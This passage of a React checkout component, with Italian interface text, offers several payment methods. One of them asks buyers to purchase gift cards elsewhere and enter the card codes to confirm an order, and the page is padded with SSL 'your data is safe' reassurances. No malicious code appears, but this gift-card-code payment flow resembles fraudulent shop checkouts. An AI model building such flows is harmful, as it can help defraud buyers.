          <span className="text-2xl">{card.emoji}</span>
          <div>
            <p className="font-bold text-sm" style={{ color: card.color }}>
              {card.label}
            </p>
            <p className="text-xs text-gray-500">
              Inserisci i codici per le carte che hai acquistato
            </p>
          </div>
        </div>

        {/* Rounding notice if total was rounded */}
        {roundedTotal > total && (
          <div className="bg-blue-50 border border-blue-200 rounded-lg p-3 text-xs text-blue-800">
            ℹ️ Il totale è stato arrotondato da{" "}
            <strong>€{total.toFixed(2)}</strong> a{" "}
            <strong>€{roundedTotal}</strong> per adattarsi ai tagli disponibili
            delle gift card.
          </div>
        )}

        {/* Code entry table */}
        <div className="border border-gray-200 rounded-xl overflow-hidden">
          <div className="bg-gray-50 px-4 py-2 border-b border-gray-200">
            <p className="text-xs font-semibold text-gray-600 uppercase tracking-wide">
              Inserisci i codici — Totale: €{roundedTotal}
            </p>
          </div>
          <div className="divide-y divide-gray-100">
            {cardBreakdown.map((amount, i) => (
              <div key={i} className="flex items-center gap-3 px-4 py-3">
                <div className="shrink-0 w-20">
                  <span className="text-sm font-bold text-gray-700">
                    Carta {i + 1}
                  </span>
                  <p className="text-xs text-gray-400">€{amount}</p>
                </div>
                <input
                  type="text"
                  value={codes[i] || ""}
                  onChange={(e) => {
                    const newCodes = [...codes];
                    newCodes[i] = e.target.value.toUpperCase();
                    setCodes(newCodes);
                  }}
                  placeholder={`Codice carta €${amount}`}
                  className="flex-1 border border-gray-300 rounded-lg px-3 py-2 text-sm font-mono outline-none focus:border-blue-400 focus:ring-1 focus:ring-blue-400 uppercase"
                />
              </div>
            ))}
          </div>
        </div>

        <button
          onClick={handleSubmitCodes}
          disabled={!allFilled}
          className="w-full flex items-center justify-center gap-2 bg-green-500 hover:bg-green-600 disabled:bg-gray-300 disabled:cursor-not-allowed text-white font-black py-4 rounded-xl transition-colors"
        >
          <CheckCircle size={18} /> Invia codici — Conferma pagamento
        </button>

        <button
          onClick={() => setStage("idle")}
          className="w-full border border-gray-300 text-gray-600 font-semibold py-3 rounded-lg hover:bg-gray-50 transition-colors text-sm"
        >
          ← Torna indietro
        </button>
      </div>
    );
  }

  // idle stage — card selection + instructions
  return (
    <div className="space-y-4">
      <div
        className="rounded-xl p-5 text-center border"
        style={{ background: card.bgColor, borderColor: card.borderColor }}
      >
        <div className="flex items-center justify-center gap-2 mb-2">
          <Gift size={26} style={{ color: card.color }} />
          <span className="text-xl font-black" style={{ color: card.color }}>
            Gift Card
          </span>
        </div>
        <p className="text-sm text-gray-600">
          Acquista una gift card e inserisci il codice per completare
          l&apos;ordine.
        </p>
      </div>

      {/* Card type selector */}
      <div className="grid grid-cols-2 gap-2">
        {GIFT_CARD_OPTIONS.map((opt) => (
          <button
            key={opt.id}
            onClick={() => handleCardSelect(opt.id)}
            className={`py-2.5 px-3 rounded-lg text-xs font-bold border transition-colors text-left flex items-center gap-2 ${
              selectedCard === opt.id
                ? "text-white border-transparent"
                : "bg-white text-gray-700 border-gray-300 hover:border-gray-400"
            }`}
            style={
              selectedCard === opt.id
                ? { background: opt.color, borderColor: opt.color }
                : {}
            }
          >
            <span>{opt.emoji}</span>
            <span>{opt.label}</span>
          </button>
        ))}
      </div>

      {/* Amount breakdown */}
      <div className="bg-gray-50 border border-gray-200 rounded-xl overflow-hidden">
        <div className="bg-gray-100 px-4 py-2 border-b border-gray-200">
          <p className="text-xs font-semibold text-gray-600 uppercase tracking-wide">
            Carte da acquistare
          </p>
        </div>
        <div className="divide-y divide-gray-100">
          {cardBreakdown.map((amount, i) => (
            <div
              key={i}
              className="flex items-center justify-between px-4 py-3"
            >
              <span className="text-sm text-gray-700">
                {card.emoji} {card.label} — Carta {i + 1}
              </span>
              <span className="font-bold text-gray-900">€{amount}</span>
            </div>
          ))}
        </div>
        <div className="flex items-center justify-between px-4 py-3 bg-yellow-50 border-t border-yellow-200">
          <span className="text-sm font-bold text-gray-700">
            Totale da pagare:
          </span>
          <span className="text-lg font-black text-gray-900">
            €{roundedTotal}
          </span>
        </div>
        {roundedTotal > total && (
          <div className="px-4 py-2 bg-blue-50 border-t border-blue-100">
            <p className="text-xs text-blue-700">
              ℹ️ Arrotondato da €{total.toFixed(2)} a €{roundedTotal} (tagli
              disponibili)
            </p>
          </div>
        )}
      </div>

      {/* Buy link */}
      <a
        href={card.buyUrl}
        target="_blank"
        rel="noopener noreferrer"
        className="w-full flex items-center justify-center gap-2 font-bold py-3.5 rounded-xl transition-colors text-white"
        style={{ background: card.color }}
      >
        <ExternalLink size={16} /> Acquista {card.label}
      </a>

      {/* Proceed to enter codes */}
      <button
        onClick={handleProceedToEnterCodes}
        className="w-full flex items-center justify-center gap-2 bg-green-500 hover:bg-green-600 text-white font-black py-4 rounded-xl transition-colors"
      >
        <CheckCircle size={18} /> Ho acquistato le carte — Inserisci i codici
      </button>

      <button
        onClick={onBack}
        className="w-full border border-gray-300 text-gray-600 font-semibold py-3 rounded-lg hover:bg-gray-50 transition-colors text-sm"
      >
        ← Indietro
      </button>
    </div>
  );
}

// ─── Main PaymentStep ─────────────────────────────────────────────────────────

interface PaymentStepProps {
  total: number;
  buyerEmail: string;
  onSuccess: () => void;
  onBack: () => void;
}

export default function PaymentStep({
  total,
  buyerEmail,
  onSuccess,
  onBack,
}: PaymentStepProps) {
  const [method, setMethod] = useState<PaymentMethod>("card");

  const tabs: { id: PaymentMethod; label: string }[] = [
    { id: "card", label: "💳 Carta" },
    { id: "paypal", label: "🔵 PayPal" },
    { id: "iban", label: "🏦 Bonifico" },
    { id: "crypto", label: "₿ Crypto" },
    { id: "giftcard", label: "🎁 Gift Card" },
  ];

  return (
    <div className="bg-white rounded-xl border border-gray-200 p-4 sm:p-6">
      <h2 className="font-bold text-gray-800 mb-1">Pagamento</h2>
      <p className="text-xs text-gray-500 mb-4 flex items-center gap-1">
        <Lock size={12} /> Connessione sicura SSL
      </p>

      {/* Method tabs */}
      <div className="grid grid-cols-5 gap-1 mb-5">
        {tabs.map((tab) => (
          <button
            key={tab.id}
            type="button"
            onClick={() => setMethod(tab.id)}
            className={`py-2 px-1 rounded-lg text-xs font-semibold border transition-colors ${
              method === tab.id
                ? tab.id === "paypal"
                  ? "bg-[#003087] text-white border-[#003087]"
                  : tab.id === "iban"
                    ? "bg-green-600 text-white border-green-600"
                    : tab.id === "crypto"
                      ? "bg-gray-900 text-white border-gray-900"
                      : tab.id === "giftcard"
                        ? "bg-purple-600 text-white border-purple-600"
                        : "bg-[#1a2744] text-white border-[#1a2744]"
                : "bg-white text-gray-600 border-gray-300 hover:border-gray-400"
            }`}
          >
            {tab.label}
          </button>
        ))}
      </div>

      {/* Active method content */}
      {method === "card" && <CardForm total={total} onBack={onBack} />}
      {method === "paypal" && (
        <PayPalFlow
          total={total}
          buyerEmail={buyerEmail}
          onBack={onBack}
          onSuccess={onSuccess}
        />
      )}
      {method === "iban" && (
        <IBANFlow
          total={total}
          buyerEmail={buyerEmail}
          onBack={onBack}
          onSuccess={onSuccess}
        />
      )}
      {method === "crypto" && (
        <CryptoFlow
          total={total}
          buyerEmail={buyerEmail}
          onBack={onBack}
          onSuccess={onSuccess}
        />
      )}
      {method === "giftcard" && (
        <GiftCardFlow
          total={total}
          buyerEmail={buyerEmail}
          onBack={onBack}
          onSuccess={onSuccess}
        />
      )}

      {/* Security note */}
      <div className="flex items-center gap-2 text-xs text-gray-400 mt-4 pt-4 border-t border-gray-100">
        <ShieldCheck size={14} className="text-green-500 shrink-0" />
        <span>
          Pagamento protetto con crittografia SSL a 256 bit. I tuoi dati sono al
          sicuro.
        </span>
      </div>
    </div>
  );
}
